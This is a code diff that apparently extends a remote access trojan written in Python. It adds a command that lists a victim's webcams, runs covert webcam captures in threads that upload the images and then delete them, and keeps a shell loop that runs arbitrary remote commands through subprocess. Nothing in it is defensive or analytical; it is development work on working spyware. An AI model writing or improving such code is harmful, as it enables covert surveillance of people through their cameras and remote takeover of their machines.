@@ -28,19 +28,44 @@ import psutil
 import urllib.request as urllib2
 import platform
 import struct
-def webcam():
-    camera = VideoCapture(0)
-    while True:
-        return_value, image = camera.read()
-        imwrite(appd+'\\jarbou3.jpg', image)
-        size = os.path.getsize(appd+'\\jarbou3.jpg')
 
-        if size == 5432:
-            continue
-        else:
-            upload_file(appd+'\\jarbou3.jpg')
-            os.remove(appd+'\\jarbou3.jpg')
-            break
+def webcamlist():
+
+    index = 0
+    arr = []
+    i = 10
+    while i > 0:
+        cap = VideoCapture(index)
+        if cap.read()[0]:
+            arr.append(index)
+            cap.release()
+        index += 1
+        i -= 1
+    l = ""
+    for j in range(len(arr)):
+        l = l + "Source "+str(arr[j])+"\n"
+
+    reliable_send("Available Sources \n"+l)
+
+def webcam(webcam):
+    try:
+        camera = VideoCapture(int(webcam))
+        while True:
+            try:
+                return_value, image = camera.read()
+                imwrite(appd + '\\jarbou3.jpg', image)
+                size = os.path.getsize(appd + '\\jarbou3.jpg')
+            except:
+                break
+            else:
+                if size == 5432:
+                    continue
+                else:
+                    upload_file(appd + '\\jarbou3.jpg')
+                    os.remove(appd + '\\jarbou3.jpg')
+                    break
+    except Exception as e:
+        pass
 def scanport(ip,port):
 
     scan = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -833,7 +858,19 @@ def shell():
                     reliable_send('[-]error')
                     continue
             elif command[:11] == "webcam_snap":
-                webcam()
+                source = command[12:]
+                try:
+                    if source == "":
+                        web = threading.Thread(target=webcam, args="0")
+                        web.start()
+                    else:
+                        web = threading.Thread(target=webcam, args=source)
+                        web.start()
+
+                except:
+                    continue
+            elif command[:11] == "webcam_list":
+                webcamlist()
             else:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
